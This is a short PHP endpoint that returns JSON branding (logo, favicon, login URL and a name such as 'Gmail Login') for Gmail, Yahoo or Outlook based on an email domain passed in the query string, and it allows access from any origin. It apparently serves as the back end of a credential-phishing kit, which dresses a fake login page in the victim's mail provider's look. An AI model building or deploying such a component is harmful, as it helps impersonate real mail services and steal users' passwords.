<?php 
header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");

$domain = strtolower($_GET['domain'] ?? 'default');

// normalize domain
if (strpos($domain, '.') === false) {
    $domain .= '.com';
}

$providers = [
    "gmail.com" => [
        "background" => "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r2.png",
        "favicon" => "https://mail.google.com/favicon.ico",
        "url" => "https://mail.google.com",
        "name" => "Gmail Login"
    ],
    "yahoo.com" => [
        "background" => "https://s.yimg.com/rz/l/yahoo_mail_en-US_s_f_p_bestfit_mail.png",
        "favicon" => "https://login.yahoo.com/favicon.ico",
        "url" => "https://login.yahoo.com",
        "name" => "Yahoo Mail"
    ],
    "outlook.com" => [
        "background" => "https://res.cdn.office.net/owamail/2024.2.0/images/logo.png",
        "favicon" => "https://login.live.com/favicon.ico",
        "url" => "https://login.live.com",
        "name" => "Outlook Login"
    ]
];
 $base = explode('.', $domain)[0];
$defaultProvider = [
    "background" => "",
    "favicon" => "",
    "url" => "https://www.google.com",
    "name" => ucfirst($base)
];

$provider = $providers[$domain] ?? $defaultProvider;

echo json_encode([
    "success" => true,
    "background" => $provider["background"],
    "favicon" => $provider["favicon"],
    "url" => $provider["url"],
    "name" => $provider["name"],
    "domain" => $domain
]);